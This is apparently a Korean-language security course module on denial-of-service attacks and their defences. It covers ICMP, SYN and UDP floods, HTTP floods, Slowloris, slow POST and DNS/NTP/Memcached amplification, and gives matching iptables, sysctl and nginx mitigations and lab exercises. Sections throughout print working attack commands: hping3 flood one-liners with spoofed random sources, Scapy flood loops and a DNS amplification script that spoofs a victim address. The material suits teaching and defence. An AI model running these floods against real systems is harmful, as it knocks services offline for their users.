# Phase 2-4: 서비스 거부 공격 (DoS/DDoS)

## 학습 목표
- DoS와 DDoS의 개념과 차이점 이해
- 네트워크 레벨 DoS 공격 메커니즘 학습 (SYN Flooding, UDP Flooding)
- Application 레벨 DoS 공격 이해 (Slowloris, HTTP Flooding)
- DDoS 증폭 공격 원리 파악 (DNS, NTP, Memcached)
- DDoS 방어 메커니즘 및 대응 전략 습득

---

## 1. DoS/DDoS 개요

### 1.1 정의

**DoS (Denial of Service)**
- 단일 공격원에서 대상 서비스 무력화
- 리소스 고갈 (CPU, 메모리, 대역폭)
- 정상 사용자 접근 차단

**DDoS (Distributed DoS)**
- 다수의 공격원(봇넷)에서 동시 공격
- 수천~수만 대 좀비 PC 동원
- 방어 훨씬 어려움

### 1.2 공격 목표

```
1. 가용성 파괴 (CIA의 A)
   - 서비스 다운
   - 응답 지연

2. 리소스 고갈
   - 대역폭 포화
   - CPU 100%
   - 메모리 부족
   - 커넥션 고갈

3. 부수 효과
   - 경제적 손실
   - 평판 손상
   - 다른 공격의 은폐 (Smokescreen)
```

### 1.3 공격 계층별 분류

```
L3 (Network): IP Flooding
L4 (Transport): SYN Flooding, UDP Flooding
L7 (Application): HTTP Flooding, Slowloris
```

---

## 2. Network Layer DoS

### 2.1 ICMP Flooding (Ping Flood)

**원리**
```
대량의 ICMP Echo Request 전송
→ 서버가 Echo Reply 응답
→ 대역폭/CPU 소모
```

**공격**
```bash
# Ping Flood
sudo ping -f -s 65500 target.com
# -f: Flood (가능한 빠르게)
# -s: 패킷 크기 (최대)

# hping3
sudo hping3 --icmp --flood target.com
```

**방어**
```
1. Rate Limiting
   - ICMP 응답 속도 제한

2. 방화벽 규칙
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

3. ICMP 차단 (극단적)
iptables -A INPUT -p icmp -j DROP
```

### 2.2 IP Fragmentation Attack

**Ping of Death**
```
원리:
1. 최대 IP 패킷 크기: 65,535바이트
2. 이보다 큰 패킷 전송 (Fragmentation)
3. 재조립 시 버퍼 오버플로우
4. 시스템 크래시

현대 OS: 패치됨
```

**Teardrop Attack**
```
원리:
1. Fragment Offset 조작
2. 겹치는 Fragment 전송
3. 재조립 실패 → 크래시

현대 OS: 방어됨
```

---

## 3. Transport Layer DoS

### 3.1 SYN Flooding

**TCP 3-Way Handshake 복습**
```
Client              Server
  |                   |
  | SYN (SEQ=100)     |
  |------------------>|
  |                   | SYN Queue에 저장
  |                   | (Half-Open Connection)
  |                   |
  | SYN+ACK           |
  |<------------------|
  |                   |
  | ACK               |
  |------------------>|
  |                   | Accept Queue로 이동
  | ESTABLISHED       | (Full Connection)
```

**공격 원리**
```
1. 공격자가 대량의 SYN 패킷 전송
   - 출발지 IP는 랜덤 위조 (응답 수신 안 함)

2. 서버가 SYN+ACK 전송
   - 위조된 IP로 전송 → 응답 없음

3. 서버가 ACK 대기
   - Timeout까지 대기 (기본 75초)
   - SYN Queue 포화

4. 정상 사용자 연결 거부
   - SYN Queue Full
   - 새 연결 불가
```

**상세 다이어그램**
```
Attacker                          Server (SYN Queue Max: 1024)
  |                                 |
  | SYN (Src: 1.2.3.4:random)       |
  |-------------------------------->| Queue: 1/1024
  |                                 |
  | SYN (Src: 5.6.7.8:random)       |
  |-------------------------------->| Queue: 2/1024
  |                                 |
  | SYN (Src: 9.10.11.12:random)    |
  |-------------------------------->| Queue: 3/1024
  |                                 |
  ... (수천 개)                     |
  |                                 | Queue: 1024/1024 (Full!)
  |                                 |
Legitimate Client                   |
  | SYN                             |
  |-------------------------------->| Queue Full → DROP
  | (Connection Refused)            |
```

**공격 도구**
```bash
# hping3
sudo hping3 -S -p 80 --flood --rand-source target.com
# -S: SYN flag
# --flood: 최대 속도
# --rand-source: 출발지 IP 랜덤

# Scapy
from scapy.all import *
target = "192.168.1.100"
for i in range(10000):
    ip = IP(src=RandIP(), dst=target)
    tcp = TCP(sport=RandShort(), dport=80, flags="S")
    send(ip/tcp, verbose=0)
```

**방어**

**1. SYN Cookies**
```
원리:
- SYN Queue를 사용하지 않음
- SYN 수신 시 상태 저장 안 함
- Sequence Number에 연결 정보 인코딩
- ACK 수신 시 검증 후 연결 수립

Linux 활성화:
sysctl -w net.ipv4.tcp_syncookies=1
```

**2. SYN Queue 크기 증가**
```bash
sysctl -w net.ipv4.tcp_max_syn_backlog=4096
```

**3. Timeout 단축**
```bash
sysctl -w net.ipv4.tcp_synack_retries=1
# 기본 5 → 1 (재전송 횟수 감소)
```

**4. Rate Limiting**
```bash
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
```

### 3.2 UDP Flooding

**특징**
```
UDP = 비연결 프로토콜
- Handshake 없음
- 상태 추적 안 함
- 빠르고 간단

→ DoS에 악용 용이
```

**공격**
```bash
# hping3
sudo hping3 --udp -p 53 --flood --rand-source target.com

# Scapy
from scapy.all import *
target = "192.168.1.100"
for i in range(100000):
    ip = IP(src=RandIP(), dst=target)
    udp = UDP(sport=RandShort(), dport=53)
    send(ip/udp/("X"*1024), verbose=0)
```

**영향**
```
1. 대역폭 소모
   - 대량 패킷 전송
   - 네트워크 포화

2. CPU 소모
   - 각 패킷 처리
   - Destination Unreachable ICMP 생성

3. 서비스 지연
   - 정상 트래픽 처리 불가
```

**방어**
```bash
# UDP 포트 제한
iptables -A INPUT -p udp --dport 53 -j ACCEPT
iptables -A INPUT -p udp -j DROP

# Rate Limiting
iptables -A INPUT -p udp -m limit --limit 10/s -j ACCEPT
iptables -A INPUT -p udp -j DROP
```

---

## 4. Application Layer DoS

### 4.1 HTTP Flooding (HTTP GET/POST Flood)

**원리**
```
정상적인 HTTP 요청을 대량으로 전송
→ 웹 서버 리소스 고갈
```

**특징**
```
- L7 공격 (응용 계층)
- 정상 트래픽처럼 보임
- 방화벽 통과
- 탐지 어려움
```

**공격 유형**

**HTTP GET Flood**
```
대량의 GET 요청:
GET / HTTP/1.1
Host: target.com

웹 서버가 매번 응답 생성
→ CPU/메모리 고갈
```

**HTTP POST Flood**
```
대량의 POST 요청:
POST /upload HTTP/1.1
Host: target.com
Content-Length: 10000000

[대용량 데이터]

→ 서버가 데이터 처리
→ 리소스 소모
```

**Cache-Miss Attack**
```
캐시되지 않은 URL 요청:
GET /?random=12345 HTTP/1.1
GET /?random=67890 HTTP/1.1

→ 매번 DB 쿼리
→ 백엔드 서버 부하
```

**공격 도구**
```bash
# Apache Bench (ab)
ab -n 100000 -c 1000 http://target.com/
# -n: 총 요청 수
# -c: 동시 연결 수

# Slowloris (아래 참조)

# LOIC (Low Orbit Ion Cannon)
# GUI 도구, Windows

# HOIC (High Orbit Ion Cannon)
# LOIC 후속, 더 강력
```

**방어**

**1. Rate Limiting (Nginx)**
```nginx
http {
    limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
    
    server {
        location / {
            limit_req zone=one burst=20 nodelay;
        }
    }
}
```

**2. Web Application Firewall (WAF)**
```
ModSecurity, Cloudflare, AWS WAF
- 비정상 패턴 탐지
- Bot 탐지
- Rate Limiting
```

**3. CAPTCHA**
```
의심스러운 트래픽 → CAPTCHA 제시
→ 봇 차단
```

**4. CDN**
```
Cloudflare, Akamai, CloudFront
- 분산 캐싱
- DDoS 흡수
- Anycast
```

### 4.2 Slowloris

**원리**
```
느린 HTTP 요청으로 연결 유지
→ 서버 연결 고갈
```

**동작**
```
1. HTTP 요청 시작
GET / HTTP/1.1
Host: target.com

2. 헤더를 천천히 전송
X-a: b
(10초 대기)
X-c: d
(10초 대기)
X-e: f
(10초 대기)
...

3. 헤더를 완성하지 않음
→ 서버가 계속 대기
→ Timeout까지 연결 유지

4. 수백~수천 개 연결 생성
→ 서버 연결 수 한계 도달
→ 정상 사용자 연결 불가
```

**특징**
```
- 느린 공격 (Low and Slow)
- 적은 대역폭으로 효과적
- 탐지 어려움
- Apache, IIS 등 취약
```

**공격**
```bash
# Slowloris (Python)
git clone https://github.com/gkbrk/slowloris
cd slowloris
python3 slowloris.py target.com

# 옵션
python3 slowloris.py target.com -p 80 -s 500 -v
# -p: 포트
# -s: 소켓 수 (연결 수)
# -v: Verbose
```

**방어**

**1. Timeout 단축**
```apache
# Apache
Timeout 30
KeepAliveTimeout 5
```

**2. 연결 제한**
```nginx
# Nginx
limit_conn_zone $binary_remote_addr zone=addr:10m;

server {
    limit_conn addr 10;  # IP당 최대 10개 연결
}
```

**3. 리버스 프록시**
```
Nginx, HAProxy
- Slowloris에 강함
- 빠른 Timeout
```

**4. ModSecurity**
```
mod_reqtimeout 모듈
- 느린 요청 탐지
- 자동 차단
```

### 4.3 Slow POST (R-U-Dead-Yet)

**원리**
```
HTTP POST의 Body를 느리게 전송
```

**동작**
```
POST /upload HTTP/1.1
Host: target.com
Content-Length: 1000000

[1바이트 전송]
(10초 대기)
[1바이트 전송]
(10초 대기)
...

→ 서버가 1MB 수신 대기
→ 연결 유지
```

**방어**
```apache
# Apache mod_reqtimeout
RequestReadTimeout body=10
# Body 수신 시작 후 10초 내 완료
```

---

## 5. DDoS 증폭 공격

### 5.1 개념

**증폭 (Amplification)**
```
작은 요청 → 큰 응답
증폭률 = 응답 크기 / 요청 크기

IP Spoofing 활용:
1. 출발지 IP를 피해자 IP로 위조
2. 증폭 서버에 요청
3. 응답이 피해자에게 전송
```

### 5.2 DNS Amplification

**원리**
```
DNS Query (ANY 타입):
- 요청: 60 바이트
- 응답: 3000 바이트
- 증폭률: 50배
```

**공격**
```bash
# Scapy
from scapy.all import *

victim = "192.168.1.100"
dns_server = "8.8.8.8"

# DNS Query (ANY)
ip = IP(src=victim, dst=dns_server)  # 출발지 위조!
udp = UDP(sport=RandShort(), dport=53)
dns = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))

send(ip/udp/dns, verbose=0, loop=1)

# 응답은 victim에게 전송됨
# 수백 대 DNS 서버 이용 → 수 Gbps
```

**방어**

**DNS 서버 측**
```
1. ANY 쿼리 차단
2. Rate Limiting
3. Response Rate Limiting (RRL)
```

**피해자 측**
```
1. Upstream Filtering (ISP)
2. Anti-DDoS 서비스 (Cloudflare)
3. BCP 38 (Ingress Filtering)
```

### 5.3 NTP Amplification

**원리**
```
NTP monlist 명령:
- 요청: 234 바이트
- 응답: 48,000 바이트
- 증폭률: 200배!
```

**공격**
```
UDP 123 (NTP) 포트
monlist 명령 (최근 통신한 600개 클라이언트 목록)
```

**방어**
```
NTP 서버:
- monlist 명령 비활성화
- ntpd 버전 업데이트 (4.2.7+)
```

### 5.4 Memcached Amplification

**역대 최대 증폭률**
```
요청: 15 바이트
응답: 750 KB
증폭률: 51,000배!
```

**공격**
```
UDP 11211 포트
stats 명령
```

**2018년 GitHub DDoS**
```
1.35 Tbps (테라비트!)
Memcached 증폭 이용
```

**방어**
```
Memcached:
- UDP 비활성화 (TCP만 사용)
- 방화벽 (외부 접근 차단)
```

### 5.5 SSDP Amplification

**UPnP SSDP**
```
UDP 1900 포트
M-SEARCH 요청
증폭률: 30배
```

**방어**
```
라우터/IoT 기기:
- UPnP 비활성화
- 외부 접근 차단
```

---

## 6. DDoS 방어 전략

### 6.1 네트워크 레벨

**1. BCP 38 (Ingress Filtering)**
```
ISP가 출발지 IP 검증
→ IP Spoofing 차단
→ 증폭 공격 원천 차단
```

**2. Rate Limiting**
```bash
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/s -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j DROP
```

**3. SYN Cookies**
```bash
sysctl -w net.ipv4.tcp_syncookies=1
```

**4. Blackhole Routing**
```
공격 트래픽을 Null Route로 전송
→ 버림

ip route add 공격자IP/32 blackhole
```

### 6.2 애플리케이션 레벨

**1. CDN**
```
Cloudflare, Akamai, Fastly
- 분산 캐싱
- Anycast
- 글로벌 PoP
```

**2. WAF**
```
- L7 공격 탐지
- Bot Detection
- Rate Limiting
- Geo-Blocking
```

**3. CAPTCHA**
```
Google reCAPTCHA
- Bot 필터링
- 의심스러운 요청만
```

**4. 리소스 제한**
```nginx
worker_processes auto;
worker_rlimit_nofile 100000;

events {
    worker_connections 4000;
    use epoll;
}
```

### 6.3 DDoS 완화 서비스

**Cloudflare**
```
- 무료 DDoS 방어
- 자동 완화
- Global Anycast
```

**AWS Shield**
```
- Standard: 무료 (L3/L4)
- Advanced: 유료 (L7, 24/7 지원)
```

**Akamai Prolexic**
```
- Enterprise급
- Scrubbing Center
```

---

## 7. 실습 과제

### 과제 1: SYN Flooding (LAB 환경)
```bash
# 테스트 서버 (Ubuntu)
# SYN Queue 확인
ss -tan | grep SYN_RECV | wc -l

# 공격 (Kali)
sudo hping3 -S -p 80 --flood --rand-source 192.168.1.100

# 모니터링
watch -n 1 'ss -tan | grep SYN_RECV | wc -l'

# 방어 테스트
sysctl -w net.ipv4.tcp_syncookies=1
# 공격 지속 → 서비스 정상
```

### 과제 2: HTTP Flood
```bash
# Apache Bench
ab -n 10000 -c 100 http://localhost/

# 서버 모니터링
top
htop
vmstat 1
```

### 과제 3: Slowloris
```bash
# Python Slowloris
python3 slowloris.py localhost -p 80 -s 200

# Apache 로그 확인
tail -f /var/log/apache2/access.log

# 연결 확인
ss -tan | grep :80 | wc -l
```

---

## 8. 연결 포인트

### Phase 1.1: Network Architecture
→ **TCP 3-Way Handshake**: SYN Flooding 기초
→ **UDP**: UDP Flooding

### Phase 2.2: Spoofing
→ **IP Spoofing**: DDoS 반사 공격

### Phase 3.1: Firewall
→ **Rate Limiting**: DoS 완화
→ **SYN Cookies**: SYN Flooding 방어

### Phase 3.2: IDS/IPS
→ **Anomaly Detection**: 비정상 트래픽 패턴

---

## 9. 핵심 요약

**DoS vs DDoS**
- DoS: 단일 공격원
- DDoS: 다수 공격원 (봇넷)

**주요 공격**
- L3: ICMP Flood
- L4: SYN Flood, UDP Flood
- L7: HTTP Flood, Slowloris

**증폭 공격**
- DNS (50배), NTP (200배), Memcached (51,000배)
- IP Spoofing + 공개 서버 악용

**방어**
- Network: BCP 38, SYN Cookies, Rate Limiting
- Application: CDN, WAF, CAPTCHA
- Service: Cloudflare, AWS Shield

---

**다음 학습**: Phase 2-5 Password Attack
